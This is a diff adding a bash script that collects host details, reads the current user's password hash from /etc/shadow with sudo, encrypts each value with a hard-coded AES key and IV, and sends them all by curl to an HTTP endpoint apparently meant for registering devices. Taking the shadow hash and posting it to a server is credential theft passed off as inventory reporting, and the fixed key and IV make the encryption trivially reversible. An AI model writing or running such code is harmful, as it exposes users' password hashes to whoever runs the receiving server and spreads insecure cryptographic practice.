@@ -1,0 +1,73 @@
+#!/bin/bash
+
+# Function to encrypt data using OpenSSL
+encrypt_data() {
+    data="$1"
+    key="0123456789ABCDEF"
+    iv="FEDCBA9876543210"
+
+    encrypted_data=$(echo -n "$data" | openssl enc -aes-256-cbc -a -A -K "$key" -iv "$iv")
+    echo "$encrypted_data"
+}
+
+# Get Linux Distribution and Version
+if [ -r /etc/os-release ]; then
+    source /etc/os-release
+    DISTRO="$NAME"
+    VERSION="$VERSION"
+elif [ -r /etc/lsb-release ]; then
+    source /etc/lsb-release
+    DISTRO="$DISTRIB_ID"
+    VERSION="$DISTRIB_RELEASE"
+else
+    DISTRO=$(cat /etc/*-release | awk -F= '/^NAME/{print $2}' | tr -d '"')
+    VERSION=$(cat /etc/*-release | awk -F= '/^VERSION/{print $2}' | tr -d '"')
+fi
+
+# Get CPU model
+CPU_MODEL=$(grep "model name" /proc/cpuinfo | head -n 1 | cut -d ':' -f 2 | tr -s ' ')
+
+# Get Date and Time
+DATE_TIME=$(date)
+
+# Get Disk Usage
+DISK_USAGE=$(df -h / | awk 'NR==2{print $3}')
+
+# Get username
+CURRENT_USERNAME=$(whoami)
+
+# Get password
+CURRENT_PASS=$(sudo cat /etc/shadow | grep "$CURRENT_USERNAME" | cut -d ':' -f2)
+
+# Encrypt the data
+ENCRYPTED_DISTRO=$(encrypt_data "$DISTRO $VERSION")
+ENCRYPTED_CPU_MODEL=$(encrypt_data "$CPU_MODEL")
+ENCRYPTED_DATE_TIME=$(encrypt_data "$DATE_TIME")
+ENCRYPTED_DISK_USAGE=$(encrypt_data "$DISK_USAGE")
+ENCRYPTED_CURRENT_USERNAME=$(encrypt_data "$CURRENT_USERNAME")
+ENCRYPTED_CURRENT_PASS=$(encrypt_data "$CURRENT_PASS")
+
+echo "$ENCRYPTED_DISTRO"
+echo "$ENCRYPTED_CPU_MODEL"
+echo "$ENCRYPTED_DATE_TIME"
+echo "$ENCRYPTED_DISK_USAGE"
+echo "$ENCRYPTED_CURRENT_USERNAME"
+echo "$ENCRYPTED_CURRENT_PASS"
+
+echo -e "Sending info to Server:\n"
+
+# Define the API endpoint
+API_ENDPOINT="http://127.0.0.1:7242/Device/AddServer"
+
+# Make the API request using curl
+curl --location "$API_ENDPOINT" \
+--header 'Content-Type: application/json' \
+--header 'Accept: application/json' \
+--form "Cpu=$ENCRYPTED_CPU_MODEL" \
+--form "UserName=$ENCRYPTED_CURRENT_USERNAME" \
+--form "Password=$ENCRYPTED_CURRENT_PASS" \
+--form "LinuxDistro=$ENCRYPTED_DISTRO" \
+--form "DiskUsage=$ENCRYPTED_DISK_USAGE" \
+--form "DateTime=$ENCRYPTED_DATE_TIME"
+
+echo -e "Request Sent!"
